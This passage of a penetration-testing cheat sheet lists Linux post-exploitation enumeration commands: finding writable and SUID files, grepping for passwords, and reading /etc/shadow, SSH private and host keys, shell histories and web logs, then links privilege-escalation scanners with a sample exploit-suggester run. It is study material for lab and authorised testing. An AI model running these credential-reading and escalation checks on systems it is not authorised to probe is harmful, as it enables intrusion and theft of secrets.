find / ( -perm -o=w -perm -o=x ) -type d 2>/dev/null   # world-writeable & executable folders

# Which configuration files can be written in /etc/? Able to reconfigure a service?
find /etc/ -readable -type f 2>/dev/null               # readable files for current user
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # readable files for current user

ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

# Which files can be written by the current user / everyone
find / -writable -type f 2>/dev/null | grep -vE 'proc|sys'
find / -writable -type f 2>/dev/null
find -maxdepth 1 -type f -perm /222

# Find files of a specific user
find / -uid 1000 -type f 2>/dev/null
find / -user name -type f 2>/dev/null
```

## Enumerate recently modified files

```bash
# Show the full timestamp and filter out all the defaul files missing the milliseconds
$ find / -type f -printf "%T+ %p" 2>/dev/null | grep -v "\.0000000000"

# Enumerate all the files having the date set up to the day but missing the time
$ find / -type f -printf "%T+ %p" 2>/dev/null | grep 00:00:00 | grep -v '/sys\|/proc\|/run'

```

## Enumerate Unmounted Disks

```bash
# Are there any unmounted file-systems?
cat /etc/fstab

# How are file-systems mounted?
mount
/bin/lsblk
```

## Enumerate Device Drivers and Kernel Modules

```bash
lsmod
/sbin/modinfo libata
```

## Enumerate Binaries That AutoElevate

```bash
# What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -u=s -type f 2>/dev/null

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

## Any plain text usernames and/or passwords?

```bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

## Confidential Information & Users

```bash
# What sensitive files can be found?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

# Anything "interesting" in the home directorie(s)? If it's possible to access
ls -ahlR /root/
ls -ahlR /home/

# Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

# What has the user being doing? Is there any password in plain text? What have they been edting?
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

# What user information can be found?
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

# Can private-key information be found?
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

# Autologin?
autologin.conf
/etc/autologin
```

## File Systems

```bash
# What can be found in /var/ ?
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

# Any settings/files (hidden) on website? Any settings file with database information?
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

## Logs

```bash
# Is there anything in the log file(s) (Could help with "Local File Includes"!)
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
```

---

# Automated Enumeration Tools

## Windows

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) [⭐⭐⭐⭐⭐] --> Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
- [Seatbelt](https://github.com/GhostPack/Seatbelt) [⭐⭐⭐⭐⭐] --> Enumeration tool which performs numerous enumeration checks. It does not actively hunt for privesc misconfiguration
- [PowerUp.ps1](https://www.powershellempire.com/?page_id=378) [⭐⭐⭐⭐] --> Only check for privilege escalation common methods
- [Watson](https://github.com/rasta-mouse/Watson) [⭐⭐⭐⭐] --> Only check for missing patches and hot-fix (most recent)
- [WindowsEnum.ps1](https://github.com/absolomb/WindowsEnum) [⭐⭐⭐⭐] --> Runs simple commands in order to automate the enumeration process. It does not actively hunt for privesc misconfiguration
- [sherlock.ps1](https://github.com/rasta-mouse/Sherlock) [⭐⭐⭐⭐] --> Only check for missing patches and hot-fix
- [wesng](https://github.com/bitsadmin/wesng) [⭐⭐⭐⭐] --> Search missing patches and hot-fix exploit starting from systeminfo output (upgraded version of [windows-exploit-suggester.py](http://windows-exploit-suggester.py/))
- [windows-privesc-check (.exe/.py)](https://github.com/pentestmonkey/windows-privesc-check) [⭐⭐⭐] --> It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps
- [windows-exploit-suggester (.py)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) [⭐⭐⭐] --> Search missing patches and hot-fix exploit starting from systeminfo output
    
    ```bash
    ┌──(kali㉿kali)-[~/…/HTB/box/Devel/exploit]
    └─$ python /opt/post-expl/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py --systeminfo sysinfo.txt --database 2021-04-18-mssb.xls
    [*] initiating winsploit version 3.3...
    [*] database file detected as xls or xlsx based on extension
    [*] attempting to read from the systeminfo input file
    [+] systeminfo input file read successfully (ascii)
    [*] querying database file for potential vulnerabilities
    ...
    [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
    [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
    [*] done
    ```
    
- [Empire](../Tools/Empire.md)
- [Emprie Standalone scripts](../Tools/Empire.md#Standalone%20scripts)
- [powersploit](../Tools/powersploit.md)

See also [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) for the compiled version of the most common .NET privesc tools (like SharpUp, Seatbelt, etc.)

## Linux

- [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) --> Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.
- [Linux Local Enumeration Script](https://github.com/Arr0way/linux-local-enumeration-script) --> Runs simple commands in order to automate the enumeration process
- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) --> It tries to gradualy expose the information depending on its importance from a privesc point of view. It runs both in interactive mode and non-interactive.
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) --> It tries to find misconfigurations that could allow local unprivilged users to escalate privileges to other users or to access local apps
- [LinEnum.sh](https://github.com/rebootuser/LinEnum) --> Scripted Local Linux Enumeration & Privilege Escalation Checks
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) --> Checks for kernel exploits